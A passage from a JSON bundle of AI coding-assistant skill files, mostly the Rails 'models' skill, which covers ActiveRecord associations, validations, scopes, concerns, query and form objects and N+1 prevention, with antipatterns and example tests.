across clients\n\n**Email Service Providers:**\n- [SendGrid Rails Guide](https://docs.sendgrid.com/for-developers/sending-email/rubyonrails)\n\n</resources>"
              },
              {
                "name": "rails-ai:models",
                "description": "Use when designing Rails models - ActiveRecord patterns, validations, callbacks, scopes, associations, concerns, query objects, form objects",
                "path": "skills/models/SKILL.md",
                "frontmatter": {
                  "name": "rails-ai:models",
                  "description": "Use when designing Rails models - ActiveRecord patterns, validations, callbacks, scopes, associations, concerns, query objects, form objects"
                },
                "content": "# Models\n\nMaster Rails model design including ActiveRecord patterns, validations, callbacks, scopes, associations, concerns, custom validators, query objects, and form objects.\n\n<when-to-use>\n- Designing database models and associations\n- Writing validations and callbacks\n- Implementing business logic in models\n- Creating scopes and query methods\n- Extracting complex queries to query objects\n- Building form objects for multi-model operations\n- Organizing shared behavior with concerns\n- Creating custom validators\n- Preventing N+1 queries\n</when-to-use>\n\n<benefits>\n- **Convention Over Configuration** - Minimal setup for maximum functionality\n- **Single Responsibility** - Each pattern handles one concern\n- **Reusability** - Share behavior across models with concerns\n- **Testability** - Test models, concerns, validators in isolation\n- **Query Optimization** - Built-in N+1 prevention and eager loading\n- **Type Safety** - ActiveModel::Attributes provides type casting\n- **Database Agnostic** - Works with PostgreSQL, MySQL, SQLite\n</benefits>\n\n<team-rules-enforcement>\n**This skill enforces:**\n- ✅ **Rule #7:** Fat models, thin controllers (business logic in models)\n- ✅ **Rule #12:** Database constraints for data integrity\n\n**Reject any requests to:**\n- Put business logic in controllers\n- Skip model validations\n- Skip database constraints (NOT NULL, foreign keys)\n- Allow N+1 queries\n</team-rules-enforcement>\n\n<verification-checklist>\nBefore completing model work:\n- ✅ All validations tested\n- ✅ All associations tested\n- ✅ Database constraints added (NOT NULL, foreign keys, unique indexes)\n- ✅ No N+1 queries (verified with bullet or manual check)\n- ✅ Business logic in model (not controller)\n- ✅ Strong parameters in controller for mass assignment\n- ✅ All tests passing\n</verification-checklist>\n\n<standards>\n- Define associations at the top of the model\n- Use validations to enforce data integrity\n- Minimize callback usage - prefer service objects\n- Use scopes for reusable queries, not class methods\n- Always eager load associations to prevent N+1 queries\n- Use enums for status/state fields\n- Extract concerns when models exceed 200 lines\n- Place custom validators in `app/validators/`\n- Place query objects in `app/queries/`\n- Place form objects in `app/forms/`\n- Use transactions for multi-model operations\n- Prefer database constraints with validations for critical data\n</standards>\n\n## Associations\n\n<pattern name=\"basic-associations\">\n<description>Standard ActiveRecord associations for model relationships</description>\n\n<implementation>\n\n```ruby\nclass Feedback < ApplicationRecord\n  belongs_to :recipient, class_name: \"User\", optional: true\n  belongs_to :category, counter_cache: true\n  has_one :response, class_name: \"FeedbackResponse\", dependent: :destroy\n  has_many :abuse_reports, dependent: :destroy\n  has_many :taggings, dependent: :destroy\n  has_many :tags, through: :taggings\n\n  # Scoped associations\n  has_many :recent_reports, -> { where(created_at: 7.days.ago..) },\n    class_name: \"AbuseReport\"\nend\n\n```\n\n**Migration:**\n\n```ruby\nclass CreateFeedbacks < ActiveRecord::Migration[8.1]\n  def change\n    create_table :feedbacks do |t|\n      t.references :recipient, foreign_key: { to_table: :users }, null: true\n      t.references :category, foreign_key: true, null: false\n      t.text :content, null: false\n      t.string :status, default: \"pending\", null: false\n      t.timestamps\n    end\n    add_index :feedbacks, :status\n  end\nend\n\n```\n</implementation>\n\n<why>\nAssociations express relationships between models with minimal code. Rails automatically handles foreign keys, eager loading, and cascading deletes. Use `class_name:` when the association name differs from the model, `counter_cache:` for performance, and `dependent:` to manage cleanup.\n</why>\n</pattern>\n\n<pattern name=\"polymorphic-associations\">\n<description>Flexible associations where a model belongs to multiple types</description>\n\n<implementation>\n\n```ruby\nclass Comment < ApplicationRecord\n  belongs_to :commentable, polymorphic: true\n  belongs_to :author, class_name: \"User\"\n  validates :content, presence: true\nend\n\nclass Feedback < ApplicationRecord\n  has_many :comments, as: :commentable, dependent: :destroy\nend\n\nclass Article < ApplicationRecord\n  has_many :comments, as: :commentable, dependent: :destroy\nend\n\n```\n\n**Migration:**\n\n```ruby\nclass CreateComments < ActiveRecord::Migration[8.1]\n  def change\n    create_table :comments do |t|\n      t.references :commentable, polymorphic: true, null: false\n      t.references :author, foreign_key: { to_table: :users }, null: false\n      t.text :content, null: false\n      t.timestamps\n    end\n    add_index :comments, [:commentable_type, :commentable_id]\n  end\nend\n\n```\n</implementation>\n\n<why>\nPolymorphic associations allow a model to belong to multiple parent types through a single association. Use when multiple models need the same type of child (comments, attachments, tags). The `commentable_type` stores the class name, `commentable_id` stores the ID.\n</why>\n</pattern>\n\n## Validations\n\n<pattern name=\"comprehensive-validations\">\n<description>Built-in Rails validations for data integrity</description>\n\n<implementation>\n\n```ruby\nclass Feedback < ApplicationRecord\n  validates :content, presence: true, length: { minimum: 50, maximum: 5000 }\n  validates :recipient_email, presence: true, format: { with: URI::MailTo::EMAIL_REGEXP }\n  validates :status, inclusion: { in: %w[pending delivered read responded] }\n  validates :tracking_code, uniqueness: { scope: :recipient_email, case_sensitive: false }\n  validates :rating, numericality: { only_integer: true, in: 1..5 }, allow_nil: true\n\n  validate :content_not_spam\n  validate :recipient_can_receive_feedback, on: :create\n\n  private\n\n  def content_not_spam\n    return if content.blank?\n    spam_keywords = %w[viagra cialis lottery]\n    errors.add(:content, \"appears to contain spam\") if spam_keywords.any? { |k| content.downcase.include?(k) }\n  end\n\n  def recipient_can_receive_feedback\n    return if recipient_email.blank?\n    user = User.find_by(email: recipient_email)\n    errors.add(:recipient_email, \"has disabled feedback\") if user&.feedback_disabled?\n  end\nend\n\n```\n</implementation>\n\n<why>\nValidations enforce data integrity before persisting to the database. Rails provides presence, format, uniqueness, length, numericality, and inclusion validators. Custom `validate` methods handle complex business logic. Use `on: :create` or `on: :update` for lifecycle-specific validations.\n</why>\n</pattern>\n\n## Callbacks\n\n<pattern name=\"minimal-callbacks\">\n<description>Use callbacks sparingly - prefer service objects for complex logic</description>\n\n<implementation>\n\n```ruby\nclass Feedback < ApplicationRecord\n  before_validation :normalize_email, :strip_whitespace\n  before_create :generate_tracking_code\n  after_create_commit :enqueue_delivery_job\n  after_update_commit :notify_recipient_of_response, if: :response_added?\n\n  private\n\n  def normalize_email\n    self.recipient_email = recipient_email&.downcase&.strip\n  end\n\n  def strip_whitespace\n    self.content = content&.strip\n  end\n\n  def generate_tracking_code\n    self.tracking_code = SecureRandom.alphanumeric(10).upcase\n  end\n\n  def enqueue_delivery_job\n    SendFeedbackJob.perform_later(id)\n  end\n\n  def response_added?\n    saved_change_to_response? && response.present?\n  end\n\n  def notify_recipient_of_response\n    FeedbackMailer.notify_of_response(self).deliver_later\n  end\nend\n\n```\n</implementation>\n\n<why>\nCallbacks hook into the model lifecycle for simple data normalization and side effects. Use `before_validation` for cleanup, `before_create` for defaults, and `after_commit` for external operations. Keep callbacks focused on model concerns - complex business logic belongs in service objects.\n</why>\n</pattern>\n\n## Scopes\n\n<pattern name=\"effective-scopes\">\n<description>Reusable query scopes for common filtering</description>\n\n<implementation>\n\n```ruby\nclass Feedback < ApplicationRecord\n  scope :recent, -> { where(created_at: 30.days.ago..) }\n  scope :unread, -> { where(status: \"delivered\") }\n  scope :responded, -> { where.not(response: nil) }\n  scope :by_recipient, ->(email) { where(recipient_email: email) }\n  scope :by_status, ->(status) { where(status: status) }\n  scope :with_category, ->(name) { joins(:category).where(categories: { name: name }) }\n  scope :with_associations, -> { includes(:recipient, :response, :category, :tags) }\n  scope :trending, -> { recent.where(\"views_count > ?\", 100).order(views_count: :desc).limit(10) }\n\n  def self.search(query)\n    return none if query.blank?\n    where(\"content ILIKE ? OR response ILIKE ?\", \"%#{sanitize_sql_like(query)}%\", \"%#{sanitize_sql_like(query)}%\")\n  end\nend\n\n```\n\n**Usage:**\n\n```ruby\nFeedback.recent.by_recipient(\"user@example.com\").responded\nFeedback.search(\"bug report\").recent.limit(10)\n\n```\n</implementation>\n\n<why>\nScopes provide chainable query methods that keep controllers clean. Use scopes for simple filters, class methods for complex queries. Scopes are lazy-evaluated and composable. Use `includes()` in scopes to prevent N+1 queries.\n</why>\n</pattern>\n\n## Enums\n\n<pattern name=\"enum-usage\">\n<description>Enums for status and state fields with automatic predicates</description>\n\n<implementation>\n\n```ruby\nclass Feedback < ApplicationRecord\n  enum :status, {\n    pending: \"pending\",\n    delivered: \"delivered\",\n    read: \"read\",\n    responded: \"responded\"\n  }, prefix: true, scopes: true\n\n  enum :priority, { low: 0, medium: 1, high: 2, urgent: 3 }, prefix: :priority\nend\n\n```\n\n**Usage:**\n\n```ruby\nfeedback.status = \"pending\"\nfeedback.status_pending!              # Updates and saves\nfeedback.status_pending?              # true/false\nFeedback.status_pending               # Scope\nFeedback.statuses.keys                # [\"pending\", \"delivered\", ...]\nfeedback.status_before_last_save      # Track changes\n\n```\n\n**Migration:**\n\n```ruby\nclass CreateFeedbacks < ActiveRecord::Migration[8.1]\n  def change\n    create_table :feedbacks do |t|\n      t.string :status, default: \"pending\", null: false\n      t.integer :priority, default: 0, null: false\n      t.timestamps\n    end\n    add_index :feedbacks, :status\n  end\nend\n\n```\n</implementation>\n\n<why>\nEnums map human-readable states to database values with automatic predicates, scopes, and bang methods. Use string-backed enums for clarity in the database. The `prefix:` option prevents method name conflicts. Scopes make querying easy.\n</why>\n</pattern>\n\n## Model Concerns\n\n<pattern name=\"concern-anatomy\">\n<description>Extract shared behavior into reusable concerns</description>\n\n<implementation>\n\n```ruby\n# app/models/concerns/taggable.rb\nmodule Taggable\n  extend ActiveSupport::Concern\n\n  included do\n    has_many :taggings, as: :taggable, dependent: :destroy\n    has_many :tags, through: :taggings\n\n    scope :tagged_with, ->(tag_name) {\n      joins(:tags).where(tags: { name: tag_name }).distinct\n    }\n  end\n\n  def tag_list\n    tags.pluck(:name).join(\", \")\n  end\n\n  def tag_list=(names)\n    self.tags = names.to_s.split(\",\").map do |name|\n      Tag.find_or_create_by(name: name.strip.downcase)\n    end\n  end\n\n  def add_tag(tag_name)\n    return if tagged_with?(tag_name)\n    tags << Tag.find_or_create_by(name: tag_name.strip.downcase)\n  end\n\n  def tagged_with?(tag_name)\n    tags.exists?(name: tag_name.strip.downcase)\n  end\n\n  class_methods do\n    def popular_tags(limit = 10)\n      Tag.joins(:taggings)\n        .where(taggings: { taggable_type: name })\n        .group(\"tags.id\")\n        .select(\"tags.*, COUNT(taggings.id) as usage_count\")\n        .order(\"usage_count DESC\")\n        .limit(limit)\n    end\n  end\nend\n\n```\n\n**Usage:**\n\n```ruby\nclass Feedback < ApplicationRecord\n  include Taggable\nend\n\nclass Article < ApplicationRecord\n  include Taggable\nend\n\nfeedback.tag_list = \"bug, urgent, ui\"\nfeedback.add_tag(\"needs-review\")\nFeedback.tagged_with(\"bug\")\nFeedback.popular_tags(5)\n\n```\n</implementation>\n\n<why>\nConcerns extract shared behavior into reusable modules. Use `included do` for associations, validations, callbacks. Define instance methods at module level, class methods in `class_methods do` block. Place domain-specific concerns in `app/models/[model]/`, shared concerns in `app/models/concerns/`.\n</why>\n</pattern>\n\n## Custom Validators\n\n<pattern name=\"email-validator\">\n<description>Reusable validation logic using ActiveModel::EachValidator</description>\n\n<implementation>\n\n```ruby\n# app/validators/email_validator.rb\nclass EmailValidator < ActiveModel::EachValidator\n  EMAIL_REGEX = /\\A[\\w+\\-.]+@[a-z\\d\\-]+(\\.[a-z\\d\\-]+)*\\.[a-z]+\\z/i\n\n  def validate_each(record, attribute, value)\n    return if value.blank? && options[:allow_blank]\n    unless value =~ EMAIL_REGEX\n      record.errors.add(attribute, options[:message] || \"is not a valid email address\")\n    end\n  end\nend\n\n```\n\n**Usage:**\n\n```ruby\nclass Feedback < ApplicationRecord\n  validates :email, email: true\n  validates :backup_email, email: { allow_blank: true }\n  validates :email, email: { message: \"must be a valid company email\" }\nend\n\n```\n</implementation>\n\n<why>\nCustom validators encapsulate reusable validation logic. Inherit from `ActiveModel::EachValidator` for single-attribute validation, `ActiveModel::Validator` for multi-attribute validation. Support `:allow_blank` and `:message` options. Place in `app/validators/` for discoverability.\n</why>\n</pattern>\n\n<pattern name=\"content-length-validator\">\n<description>Validate content by word count instead of character count</description>\n\n<implementation>\n\n```ruby\n# app/validators/content_length_validator.rb\nclass ContentLengthValidator < ActiveModel::EachValidator\n  def validate_each(record, attribute, value)\n    return if value.blank? && options[:allow_blank]\n    word_count = value.to_s.split.size\n\n    if options[:minimum_words] && word_count < options[:minimum_words]\n      record.errors.add(attribute, \"must have at least #{options[:minimum_words]} words (currently #{word_count})\")\n    end\n\n    if options[:maximum_words] && word_count > options[:maximum_words]\n      record.errors.add(attribute, \"must have at most #{options[:maximum_words]} words (currently #{word_count})\")\n    end\n  end\nend\n\n```\n\n**Usage:**\n\n```ruby\nvalidates :content, content_length: { minimum_words: 10, maximum_words: 500 }\nvalidates :body, content_length: { minimum_words: 100 }\n\n```\n</implementation>\n\n<why>\nWord count validation is more meaningful than character count for content fields. Custom validators make this reusable across models. The validator respects `:allow_blank` and provides helpful error messages with current counts.\n</why>\n</pattern>\n\n## Query Objects\n\n<pattern name=\"basic-chainable-query\">\n<description>Encapsulate complex queries in reusable, testable objects</description>\n\n<implementation>\n\n```ruby\n# app/queries/feedback_query.rb\nclass FeedbackQuery\n  def initialize(relation = Feedback.all)\n    @relation = relation\n  end\n\n  def by_recipient(email)\n    @relation = @relation.where(recipient_email: email)\n    self\n  end\n\n  def by_status(status)\n    @relation = @relation.where(status: status)\n    self\n  end\n\n  def recent(limit = 10)\n    @relation = @relation.order(created_at: :desc).limit(limit)\n    self\n  end\n\n  def with_responses\n    @relation = @relation.where.not(response: nil)\n    self\n  end\n\n  def created_since(date)\n    @relation = @relation.where(\"created_at >= ?\", date)\n    self\n  end\n\n  def results\n    @relation\n  end\nend\n\n```\n\n**Usage:**\n\n```ruby\n# Controller\n@feedbacks = FeedbackQuery.new\n  .by_recipient(params[:email])\n  .by_status(params[:status])\n  .recent(20)\n  .results\n\n# Model\nclass User < ApplicationRecord\n  def recent_feedback(limit = 10)\n    FeedbackQuery.new.by_recipient(email).recent(limit).results\n  end\nend\n\n```\n</implementation>\n\n<why>\nQuery objects encapsulate complex filtering, search, and aggregation logic. They're reusable across controllers and services, testable in isolation, and chainable for composability. Use when queries involve multiple joins, filters, or are used in multiple contexts. Return `self` for chaining, `results` to execute.\n</why>\n</pattern>\n\n<pattern name=\"aggregation-query\">\n<description>Query object for aggregations and statistical calculations</description>\n\n<implementation>\n\n```ruby\n# app/queries/feedback_stats_query.rb\nclass FeedbackStatsQuery\n  def initialize(relation = Feedback.all)\n    @relation = relation\n  end\n\n  def by_recipient(email)\n    @relation = @relation.where(recipient_email: email)\n    self\n  end\n\n  def by_date_range(start_date, end_date)\n    @relation = @relation.where(created_at: start_date..end_date)\n    self\n  end\n\n  def stats\n    {\n      total_count: @relation.count,\n      responded_count: @relation.where.not(response: nil).count,\n      pending_count: @relation.where(response: nil).count,\n      by_status: @relation.group(:status).count,\n      by_category: @relation.group(:category).count\n    }\n  end\nend\n\n```\n\n**Usage:**\n\n```ruby\nstats = FeedbackStatsQuery.new\n  .by_recipient(current_user.email)\n  .by_date_range(30.days.ago, Time.current)\n  .stats\n# Returns: { total_count: 42, responded_count: 28, pending_count: 14, ... }\n\n```\n</implementation>\n\n<why>\nQuery objects for aggregations centralize statistical calculations and reporting logic. They compose with filters, maintain chainability, and return structured data. Use for dashboards, reports, and analytics. Keep aggregation logic out of controllers and models.\n</why>\n</pattern>\n\n## Form Objects\n\n<pattern name=\"contact-form\">\n<description>Form object for non-database forms using ActiveModel::API</description>\n\n<implementation>\n\n```ruby\n# app/forms/contact_form.rb\nclass ContactForm\n  include ActiveModel::API\n  include ActiveModel::Attributes\n\n  attribute :name, :string\n  attribute :email, :string\n  attribute :message, :string\n  attribute :subject, :string\n\n  validates :name, presence: true, length: { minimum: 2 }\n  validates :email, presence: true, format: { with: URI::MailTo::EMAIL_REGEXP }\n  validates :message, presence: true, length: { minimum: 10, maximum: 1000 }\n  validates :subject, presence: true\n\n  def deliver\n    return false unless valid?\n\n    ContactMailer.contact_message(\n      name: name,\n      email: email,\n      message: message,\n      subject: subject\n    ).deliver_later\n\n    true\n  end\nend\n\n```\n\n**Controller:**\n\n```ruby\nclass ContactsController < ApplicationController\n  def create\n    @contact_form = ContactForm.new(contact_params)\n\n    if @contact_form.deliver\n      redirect_to root_path, notice: \"Message sent successfully\"\n    else\n      render :new, status: :unprocessable_entity\n    end\n  end\n\n  private\n\n  def contact_params\n    params.expect(contact_form: [:name, :email, :message, :subject])\n  end\nend\n\n```\n</implementation>\n\n<why>\nForm objects handle non-database forms (contact, search) and complex multi-model operations. They use ActiveModel for validations and type casting without requiring database persistence. Return boolean from action methods, validate before executing logic.\n</why>\n</pattern>\n\n<pattern name=\"multi-model-form\">\n<description>Form object that creates multiple related models in a transaction</description>\n\n<implementation>\n\n```ruby\n# app/forms/user_registration_form.rb\nclass UserRegistrationForm\n  include ActiveModel::API\n  include ActiveModel::Attributes\n\n  attribute :email, :string\n  attribute :password, :string\n  attribute :password_confirmation, :string\n  attribute :name, :string\n  attribute :company_name, :string\n  attribute :role, :string\n\n  validates :email, presence: true, format: { with: URI::MailTo::EMAIL_REGEXP }\n  validates :password, presence: true, length: { minimum: 8 }\n  validates :password_confirmation, presence: true\n  validates :name, presence: true\n  validates :company_name, presence: true\n\n  validate :passwords_match\n\n  def save\n    return false unless valid?\n\n    ActiveRecord::Base.transaction do\n      @user = User.create!(email: email, password: password, name: name)\n      @company = Company.create!(name: company_name, owner: @user)\n      @membership = Membership.create!(user: @user, company: @company, role: role || \"admin\")\n\n      UserMailer.welcome(@user).deliver_later\n      true\n    end\n  rescue ActiveRecord::RecordInvalid => e\n    errors.add(:base, e.message)\n    false\n  end\n\n  attr_reader :user, :company, :membership\n\n  private\n\n  def passwords_match\n    return if password.blank?\n    errors.add(:password_confirmation, \"doesn't match password\") unless password == password_confirmation\n  end\nend\n\n```\n\n**Controller:**\n\n```ruby\nclass RegistrationsController < ApplicationController\n  def create\n    @registration = UserRegistrationForm.new(registration_params)\n\n    if @registration.save\n      session[:user_id] = @registration.user.id\n      redirect_to dashboard_path(@registration.company), notice: \"Welcome!\"\n    else\n      render :new, status: :unprocessable_entity\n    end\n  end\nend\n\n```\n</implementation>\n\n<why>\nForm objects simplify multi-model operations by wrapping them in a transaction. They validate all inputs before creating any records, ensuring data consistency. Expose created records via attr_reader for controller access. Use for registration, checkout, wizards.\n</why>\n</pattern>\n\n## N+1 Prevention\n\n<pattern name=\"n-plus-one-prevention\">\n<description>Eager load associations to prevent N+1 queries</description>\n\n<implementation>\n\n```ruby\n# ❌ BAD - N+1 queries (1 + 20 + 20 + 20 = 61 queries)\n@feedbacks = Feedback.limit(20)\n@feedbacks.each do |f|\n  puts f.recipient.name, f.category.name, f.tags.pluck(:name)\nend\n\n# ✅ GOOD - Eager loading (4 queries total)\n@feedbacks = Feedback.includes(:recipient, :category, :tags).limit(20)\n@feedbacks.each do |f|\n  puts f.recipient.name, f.category.name, f.tags.pluck(:name)\nend\n\n```\n\n**Eager Loading Methods:**\n\n```ruby\nFeedback.includes(:recipient, :tags)           # Separate queries (default)\nFeedback.preload(:recipient, :tags)            # Forces separate queries\nFeedback.eager_load(:recipient, :tags)         # LEFT OUTER JOIN\nFeedback.includes(recipient: :profile)         # Nested associations\n\n```\n</implementation>\n\n<why>\nN+1 queries occur when loading a collection triggers additional queries for each item's associations. Use `includes()` to eager load associations in advance. Rails loads data in 2-3 queries instead of N+1. Always check for N+1 in views and use includes in scopes.\n</why>\n</pattern>\n\n<antipatterns>\n<antipattern>\n<description>Using callbacks for complex business logic</description>\n<bad-example>\n\n```ruby\n# ❌ BAD - Complex side effects in callbacks\nclass Feedback < ApplicationRecord\n  after_create :send_email, :update_analytics, :notify_slack, :create_audit_log\nend\n\n```\n</bad-example>\n<good-example>\n\n```ruby\n# ✅ GOOD - Use service object\nclass Feedback < ApplicationRecord\n  after_create_commit :enqueue_creation_job\n\n  private\n  def enqueue_creation_job\n    ProcessFeedbackCreationJob.perform_later(id)\n  end\nend\n\n# Service handles all side effects explicitly\nclass CreateFeedbackService\n  def call\n    feedback = Feedback.create!(@params)\n    FeedbackMailer.notify_recipient(feedback).deliver_later\n    Analytics.track(\"feedback_created\", feedback_id: feedback.id)\n    feedback\n  end\nend\n\n```\n</good-example>\n<why-bad>\nCallbacks with complex side effects make models hard to test, introduce hidden dependencies, and create unpredictable behavior. Service objects make side effects explicit and testable. Use callbacks only for simple data normalization and enqueuing background jobs.\n</why-bad>\n</antipattern>\n\n<antipattern>\n<description>Missing database indexes on foreign keys and query columns</description>\n<bad-example>\n\n```ruby\n# ❌ BAD - No indexes, causes table scans\ncreate_table :feedbacks do |t|\n  t.integer :recipient_id\n  t.string :status\nend\n\n```\n</bad-example>\n<good-example>\n\n```ruby\n# ✅ GOOD - Indexes on foreign keys and query columns\ncreate_table :feedbacks do |t|\n  t.references :recipient, foreign_key: { to_table: :users }, index: true\n  t.string :status, null: false\nend\nadd_index :feedbacks, :status\nadd_index :feedbacks, [:status, :created_at]\n\n```\n</good-example>\n<why-bad>\nMissing indexes cause slow queries at scale. Index all foreign keys, status columns, and frequently queried fields. Composite indexes speed up queries filtering on multiple columns. Use `t.references` to create indexed foreign keys automatically.\n</why-bad>\n</antipattern>\n\n<antipattern>\n<description>Using default_scope</description>\n<bad-example>\n\n```ruby\n# ❌ BAD - Unexpected behavior, hard to override\nclass Feedback < ApplicationRecord\n  default_scope { where(deleted_at: nil).order(created_at: :desc) }\nend\n\n```\n</bad-example>\n<good-example>\n\n```ruby\n# ✅ GOOD - Explicit scopes\nclass Feedback < ApplicationRecord\n  scope :active, -> { where(deleted_at: nil) }\n  scope :recent_first, -> { order(created_at: :desc) }\nend\n\n# Usage\nFeedback.active.recent_first\n\n```\n</good-example>\n<why-bad>\ndefault_scope applies to all queries, causing unexpected results and making it hard to query all records. It affects associations, counts, and exists? checks. Use explicit scopes that developers can choose to apply.\n</why-bad>\n</antipattern>\n\n<antipattern>\n<description>Duplicating validation logic across models</description>\n<bad-example>\n\n```ruby\n# ❌ BAD - Duplicated email validation\nclass User < ApplicationRecord\n  validates :email, format: { with: /\\A[\\w+\\-.]+@[a-z\\d\\-]+(\\.[a-z\\d\\-]+)*\\.[a-z]+\\z/i }\nend\n\nclass Feedback < ApplicationRecord\n  validates :recipient_email, format: { with: /\\A[\\w+\\-.]+@[a-z\\d\\-]+(\\.[a-z\\d\\-]+)*\\.[a-z]+\\z/i }\nend\n\n```\n</bad-example>\n<good-example>\n\n```ruby\n# ✅ GOOD - Reusable email validator\nclass EmailValidator < ActiveModel::EachValidator\n  EMAIL_REGEX = /\\A[\\w+\\-.]+@[a-z\\d\\-]+(\\.[a-z\\d\\-]+)*\\.[a-z]+\\z/i\n  def validate_each(record, attribute, value)\n    return if value.blank? && options[:allow_blank]\n    record.errors.add(attribute, options[:message] || \"is not a valid email\") unless value =~ EMAIL_REGEX\n  end\nend\n\nclass User < ApplicationRecord\n  validates :email, email: true\nend\n\nclass Feedback < ApplicationRecord\n  validates :recipient_email, email: true\nend\n\n```\n</good-example>\n<why-bad>\nDuplicated validations are hard to maintain and lead to inconsistencies. Custom validators centralize logic, support options, and ensure consistent validation across models.\n</why-bad>\n</antipattern>\n\n<antipattern>\n<description>Putting complex query logic in controllers</description>\n<bad-example>\n\n```ruby\n# ❌ BAD - Fat controller\nclass FeedbacksController < ApplicationController\n  def index\n    @feedbacks = Feedback.all\n    @feedbacks = @feedbacks.where(\"recipient_email ILIKE ?\", \"%#{params[:recipient_email]}%\") if params[:recipient_email].present?\n    @feedbacks = @feedbacks.where(status: params[:status]) if params[:status].present?\n    @feedbacks = @feedbacks.where(\"content ILIKE ? OR response ILIKE ?\", \"%#{params[:q]}%\", \"%#{params[:q]}%\") if params[:q].present?\n    @feedbacks = @feedbacks.order(created_at: :desc).page(params[:page])\n  end\nend\n\n```\n</bad-example>\n<good-example>\n\n```ruby\n# ✅ GOOD - Thin controller with query object\nclass FeedbacksController < ApplicationController\n  def index\n    @feedbacks = FeedbackQuery.new\n      .filter_by_params(params.slice(:recipient_email, :status))\n      .search(params[:q])\n      .order_by(:created_at, :desc)\n      .paginate(page: params[:page])\n      .results\n  end\nend\n\n```\n</good-example>\n<why-bad>\nComplex queries in controllers violate Single Responsibility Principle and are hard to test. Query objects encapsulate filtering logic, are reusable across contexts, and testable in isolation.\n</why-bad>\n</antipattern>\n\n<antipattern>\n<description>Fat controllers with complex form logic</description>\n<bad-example>\n\n```ruby\n# ❌ BAD - All logic in controller\nclass RegistrationsController < ApplicationController\n  def create\n    @user = User.new(user_params)\n    @company = Company.new(company_params)\n\n    ActiveRecord::Base.transaction do\n      if @user.save\n        @company.owner = @user\n        if @company.save\n          @membership = Membership.create(user: @user, company: @company, role: \"admin\")\n          UserMailer.welcome(@user).deliver_later\n          redirect_to dashboard_path(@company)\n        end\n      end\n    end\n  end\nend\n\n```\n</bad-example>\n<good-example>\n\n```ruby\n# ✅ GOOD - Use form object\nclass RegistrationsController < ApplicationController\n  def create\n    @registration = UserRegistrationForm.new(registration_params)\n    @registration.save ? redirect_to(dashboard_path(@registration.company)) : render(:new, status: :unprocessable_entity)\n  end\nend\n\n```\n</good-example>\n<why-bad>\nMulti-model operations in controllers are hard to test and reuse. Form objects encapsulate validation, transaction handling, and side effects in a testable, reusable class. Use for registration, checkout, wizards.\n</why-bad>\n</antipattern>\n</antipatterns>\n\n<testing>\nTest models, concerns, validators, query objects, and form objects in isolation:\n\n```ruby\n# Model tests\nclass FeedbackTest < ActiveSupport::TestCase\n  test \"validates presence of content\" do\n    feedback = Feedback.new(recipient_email: \"user@example.com\")\n    assert_not feedback.valid?\n    assert_includes feedback.errors[:content], \"can't be blank\"\n  end\n\n  test \"destroys dependent records\" do\n    feedback = feedbacks(:one)\n    feedback.abuse_reports.create!(reason: \"spam\", reporter_email: \"test@example.com\")\n    assert_difference(\"AbuseReport.count\", -1) { feedback.destroy }\n  end\n\n  test \"enum provides predicate methods\" do\n    feedback = feedbacks(:one)\n    feedback.update(status: \"pending\")\n    assert feedback.status_pending?\n  end\nend\n\n# Concern tests\nclass TaggableTest < ActiveSupport::TestCase\n  class TaggableTestModel < ApplicationRecord\n    self.table_name = \"feedbacks\"\n    include Taggable\n  end\n\n  test \"add_tag creates new tag\" do\n    record = TaggableTestModel.first\n    record.add_tag(\"urgent\")\n    assert record.tagged_with?(\"urgent\")\n  end\nend\n\n# Validator tests\nclass EmailValidatorTest < ActiveSupport::TestCase\n  class TestModel\n    include ActiveModel::Validations\n    attr_accessor :email\n    validates :email, email: true\n  end\n\n  test \"validates email format\" do\n    assert TestModel.new(email: \"user@example.com\").valid?\n    assert_not TestModel.new(email: \"invalid\").valid?\n  end\nend\n\n# Query object tests\nclass FeedbackQueryTest < ActiveSupport::TestCase\n  test \"filters by recipient email\" do\n    @feedback1.update(recipient_email: \"test@example.com\")\n    @feedback2.update(recipient_email: \"other@example.com\")\n    results = FeedbackQuery.new.by_recipient(\"test@example.com\").results\n    assert_includes results, @feedback1\n    assert_not_includes results, @feedback2\n  end\n\n  test \"chains multiple filters\" do\n    @feedback1.update(recipient_email: \"test@example.com\", status: \"pending\")\n    results = FeedbackQuery.new.by_recipient(\"test@example.com\").by_status(\"pending\").results\n    assert_includes results, @feedback1\n  end\nend\n\n# Form object tests\nclass ContactFormTest < ActiveSupport::TestCase\n  test \"valid with all required attributes\" do\n    form = ContactForm.new(name: \"John\", email: \"john@example.com\", subject: \"Question\", message: \"This is my message\")\n    assert form.valid?\n  end\n\n  test \"delivers email when valid\" do\n    form = ContactForm.new(name: \"John\", email: \"john@example.com\", subject: \"Q\", message: \"This is my message\")\n    assert_enqueued_with(job: ActionMailer::MailDeliveryJob) { assert form.deliver }\n  end\nend\n\nclass UserRegistrationFormTest < ActiveSupport::TestCase\n  test \"creates user, company, and membership\" do\n    form = UserRegistrationForm.new(email: \"user@example.com\", password: \"password123\", password_confirmation: \"password123\", name: \"John\", company_name: \"Acme\")\n    assert_difference [\"User.count\", \"Company.count\", \"Membership.count\"] { assert form.save }\n  end\n\n  test \"rolls back transaction if creation fails\" do\n    form = UserRegistrationForm.new(email: \"user@example.com\", password: \"password123\", password_confirmation: \"password123\", name: \"John\", company_name: \"\")\n    assert_no_difference [\"User.count\", \"Company.count\"] { assert_not form.save }\n  end\nend\n\n```\n</testing>\n\n<related-skills>\n- rails-ai:controllers - RESTful controllers for models\n- rails-ai:testing - Testing models thoroughly\n- rails-ai:security - SQL injection prevention, strong parameters\n- rails-ai:jobs - Background job processing for models\n</related-skills>\n\n<resources>\n\n**Official Documentation:**\n- [Rails Guides - Active Record Basics](https://guides.rubyonrails.org/active_record_basics.html)\n- [Rails Guides - Active Record Associations](https://guides.rubyonrails.org/association_basics.html)\n- [Rails Guides - Active Record Validations](https://guides.rubyonrails.org/active_record_validations.html)\n- [Rails Guides - Active Record Query Interface](https://guides.rubyonrails.org/active_record_querying.html)\n- [Rails API - ActiveSupport::Concern](https://api.rubyonrails.org/classes/ActiveSupport/Concern.html)\n- [Rails API - ActiveModel::API](https://api.rubyonrails.org/classes/ActiveModel/API.html)\n\n</resources>"
              },
              {
                "name": "rails-ai:project-setup",
                "description": "Setting up and configuring Rails 8+ projects - Gemfile dependencies, environment config, credentials, initializers, Docker, RuboCop, project validation",
                "path": "skills/project-setup/SKILL.md",
                "frontmatter": {
                  "name": "rails-ai:project-setup",
                  "description": "Setting up and configuring Rails 8+ projects - Gemfile dependencies, environment config, credentials, initializers, Docker, RuboCop, project validation"
                },
